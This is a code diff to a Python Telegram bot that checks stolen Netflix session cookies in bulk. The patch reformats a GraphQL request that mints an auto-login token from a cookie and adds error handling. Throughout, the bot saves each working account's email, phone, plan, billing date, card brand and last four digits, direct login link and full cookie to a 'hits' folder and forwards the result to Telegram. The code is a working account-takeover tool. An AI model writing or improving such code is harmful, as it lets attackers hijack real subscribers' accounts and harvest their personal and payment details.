@@ -61,10 +61,22 @@ class NetflixBulkChecker:
             for name, value in cookies_dict.items():
                 session.cookies.set(name, value, domain='.netflix.com', path='/')
             
-            payload = {"operationName": "CreateAutoLoginToken", "variables": {"scope": "WEBVIEW_MOBILE_STREAMING"}, "extensions": {"persistedQuery": {"version": 102, "id": "76e97129-f4b5-41a0-a73c-12e674896849"}}}
-            headers = {'User-Agent': 'com.netflix.mediaclient/63884 (Linux; U; Android 13)', 'Accept': 'application/json', 'Content-Type': 'application/json'}
+            payload = {
+                "operationName": "CreateAutoLoginToken",
+                "variables": {"scope": "WEBVIEW_MOBILE_STREAMING"},
+                "extensions": {"persistedQuery": {"version": 102, "id": "76e97129-f4b5-41a0-a73c-12e674896849"}}
+            }
+            headers = {
+                'User-Agent': 'com.netflix.mediaclient/63884 (Linux; U; Android 13)',
+                'Accept': 'application/json',
+                'Content-Type': 'application/json'
+            }
             
-            response = session.post('https://android13.prod.ftl.netflix.com/graphql', headers=headers, json=payload, timeout=15)
+            response = session.post(
+                'https://android13.prod.ftl.netflix.com/graphql',
+                headers=headers, json=payload, timeout=15
+            )
+            
             if response.status_code == 200:
                 data = response.json()
                 if data.get('data', {}).get('createAutoLoginToken'):
@@ -227,37 +239,40 @@ def handle_zip(message):
 @bot.message_handler(func=lambda m: True)
 def handle_direct_cookie(message):
     text = message.text.strip()
-    if not ("NetflixId=" in text or "\t" in text):
+    if not text or not ("NetflixId=" in text or "\t" in text):
         return
 
-    bot.reply_to(message, "🔄 Processing single cookie...")
+    bot.reply_to(message, "🔄 Processing cookie...")
 
-    checker = NetflixBulkChecker()
-    checker.chat_id = str(message.chat.id)
-    result = checker.check_cookie(text, "direct_chat")
+    try:
+        checker = NetflixBulkChecker()
+        checker.chat_id = str(message.chat.id)
+        result = checker.check_cookie(text, "direct_chat")
 
-    if result:
-        # Save to hits folder
-        os.makedirs('hits', exist_ok=True)
-        fname = f"[{result['country_code']}] [{result['email']}] - {result['plan']}.txt"
-        with open(f"hits/{fname}", 'w', encoding='utf-8') as f:
-            f.write(f"Email: {result['email']}\n")
-            f.write(f"Plan: {result['plan']}\n")
-            f.write(f"Country: {result['country_code']}\n")
-            f.write(f"Next Billing: {result['next_billing']}\n")
-            f.write(f"Phone: {result['phone']}\n")
-            f.write(f"Card: {result['card_brand']} ••••{result['last4']}\n")
-            f.write(f"Profiles: {result['profiles']}\n")
-            f.write(f"Login URL: {result.get('login_url', 'N/A')}\n\n")
-            f.write("--- FULL COOKIE ---\n")
-            f.write(result['cookie'])
+        if result and result.get('login_url'):
+            bot.reply_to(message, f"✅ **Direct Login Link Ready**\n\n{result['login_url']}")
+            
+            # Save to hits folder
+            os.makedirs('hits', exist_ok=True)
+            fname = f"[{result['country_code']}] [{result['email']}] - {result['plan']}.txt"
+            with open(f"hits/{fname}", 'w', encoding='utf-8') as f:
+                f.write(f"Email: {result['email']}\n")
+                f.write(f"Plan: {result['plan']}\n")
+                f.write(f"Country: {result['country_code']}\n")
+                f.write(f"Next Billing: {result['next_billing']}\n")
+                f.write(f"Phone: {result['phone']}\n")
+                f.write(f"Card: {result['card_brand']} ••••{result['last4']}\n")
+                f.write(f"Profiles: {result['profiles']}\n")
+                f.write(f"Login URL: {result['login_url']}\n\n")
+                f.write("--- FULL COOKIE ---\n")
+                f.write(result['cookie'])
+            
+            checker.send_hit_to_telegram(result)
+        else:
+            bot.reply_to(message, "❌ Invalid or Dead Cookie")
 
-        # Send login link
-        bot.reply_to(message, f"✅ **Login Link Ready**\n\n{result.get('login_url', 'N/A')}")
-        
-        checker.send_hit_to_telegram(result)
-    else:
-        bot.reply_to(message, "❌ Invalid or Dead Cookie")
+    except Exception as e:
+        bot.reply_to(message, f"Error: {str(e)}")
 
 if __name__ == "__main__":
     print("🚀 Netflix Cookie Checker Bot Started")
